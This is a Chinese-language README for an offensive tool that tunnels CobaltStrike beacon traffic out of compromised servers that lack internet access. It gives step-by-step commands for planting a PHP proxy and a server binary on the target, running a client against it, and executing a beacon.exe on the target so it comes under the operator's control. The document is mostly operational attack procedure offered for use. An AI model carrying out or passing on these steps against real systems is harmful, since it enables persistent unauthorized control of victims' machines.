# C2ReverseProxy

ReverseProxy C2 - 在不出网的情况下使cs上线

# Description

在渗透过程中遇到不出网的环境时，可使用该工具建立反向代理通道，使CobaltStrike生成的beacon可以回弹到CobaltStrike服务器。

# Install

```
git clone https://github.com/Daybr4ak/DReverseProxy.git
```

# Usage

```markdown
该文件分为3个部分：
1、C2script  
2、C2ReverseClint
3、C2ReverseServer

使用步骤：
1、将C2script目录下的对应文件，如proxy.php 以及C2ReverseServer上传到目标服务器。
2、使用C2ReverseServer建立监听端口：
./C2ReverseServer 8888 (默认为8000)
3、修改C2script目录下对应文件的PORT，与C2ReverseServer监听的端口一致。
4、本地或C2服务器上运行C2ReverseClint工具
./C2ReverseClint --addr C2IP:C2ListenerPort --target http://example.com/proxy.php (传送到目标服务器上的proxy.php路径)
5、使用CobaltStrike建立本地Listener(127.0.0.1 8888)端口与C2ReverseServer建立的端口对应
6、使用建立的Listner生成可执行文件beacon.exe传至目标服务器运行
7、可以看到CobaltStrike上线。
```

